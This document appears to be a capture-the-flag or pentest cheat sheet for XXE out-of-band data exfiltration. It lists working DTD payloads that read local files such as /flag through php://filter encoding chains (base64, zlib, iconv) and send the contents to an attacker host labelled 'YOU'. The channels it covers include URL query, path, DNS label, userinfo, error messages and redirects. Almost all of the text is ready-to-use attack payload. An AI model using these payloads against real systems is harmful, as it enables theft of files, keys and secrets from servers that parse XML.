# Exfil Encoding — making content URL/DNS-safe

## The problem — file content breaks the URI

`file:///flag` content with ` `/`\n`/`?`/`&`/`/`/`#`/`%`/`<`/`"`/`'`
breaks the exfil URI — the fetch fails or truncates at the first bad
char.

## The b64-wrap — PHP

```dtd
<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % w "<!ENTITY s SYSTEM 'http://YOU/?d=%f;'>">
%w;
```

`%f;` is now base64 — all URL-safe chars — the URI survives, the
listener decodes.

## The `zlib.deflate`+`base64` — shrink + encode

```dtd
<!ENTITY % f SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/flag">
```

Compress then encode — big files fit smaller URIs.

## The `convert.iconv` — charset transforms

```dtd
<!ENTITY % f SYSTEM "php://filter/convert.iconv.utf-8.utf-16/resource=/flag">
```

Charset-transforms — some make content non-URL-safe but change the
byte-shape — the `iconv`-oracle family — byte-leak via output-length.

## The `quoted-printable`/`uuencode` — alternate encoders

```dtd
php://filter/convert.quoted-printable-encode/resource=/flag
php://filter/convert.uuencode/resource=/flag
```

Quoted-printable keeps printable text readable — uuencode is a
different wrap — alternate encodings when base64 is filtered.

## The `convert.base64-decode` — the decode-in-read

```dtd
php://filter/convert.base64-decode/resource=/x.b64
```

A b64 file decoded — the decode direction.

## The multi-filter chain — `|`-composition

```dtd
php://filter/zlib.deflate|convert.base64-encode/resource=/flag
php://filter/convert.iconv.UCS-4LE.UCS-4|convert.base64-encode/resource=/flag
```

`|` chains filters — order matters — the chain-composition engine of
the "oracle" tricks.

## The "the file is base64 already" — read-then-decode

A `.b64`/`.pem`/`.key` file is already b64 — read raw — no encode
needed.

## The DNS-label-safe transform — for the host channel

`http://%f;.YOU/` — only alnum+dash survive — the `php://filter`
`convert.iconv`-hex or a `base32`-ish transform — for very short
content (a flag, a token).

## The "the content is the URI" — the path channel

`http://YOU/%f;` — content in the path — survives `?`/`&`/`#` —
breaks on `//` and `%` — the path-form for non-PHP stacks.

## The "the content is the query" — the query channel

`http://YOU/?d=%f;` — survives `&`? No — `&` splits params — breaks
on `&`/`#`/space — the most-fragile but most-common form.

## The "the content is the fragment" — DEAD

`http://YOU/#%f;` — fragments are client-side — never sent — the
fragment channel is dead — don't use it.

## The "the content is the port" — the port-channel (novel)

`http://YOU:%f;/` — content in the port position — only digits — a
port-oracle for numeric content — niche.

## The "the content is the userinfo" — `http://%f;@YOU/`

`user:pass@host` — content in userinfo — survives more chars than
path — a niche channel.

## The "the entity name is the exfil" — the name-channel

```dtd
<!ENTITY % f SYSTEM "file:///flag">
<!ENTITY % e "<!ENTITY %f;>">
%e;
```

`%f;` becomes an entity NAME — the error `Entity '<content>' not
defined` carries it — name-safe content only.

## The "the URI is the error" — the error-channel

`file:///nonexistent/%f;` — the FileNotFound URI carries the content —
no listener needed — `errors-deep.md`.

## The "encode it yourself in the DTD" — the DTD-as-encoder

Param-entities can BUILD the encoded form inside the DTD — a DTD that
takes `%f;` and builds a hex/base64 form via nested entities — the
"the DTD encodes the content" deep trick — complex, parser-dependent.

## The "the content goes in a header" — the header-channel

`http://YOU/` with the content in a custom `X-Exfil:` header — the
request headers are logged — the header is an alternate carrier.

## The "the content is in the Referer" — the redirect-chain

Your listener 302s with `Location: http://YOU/leak?d=...` — the
parser follows → the redirect URL carries the content.
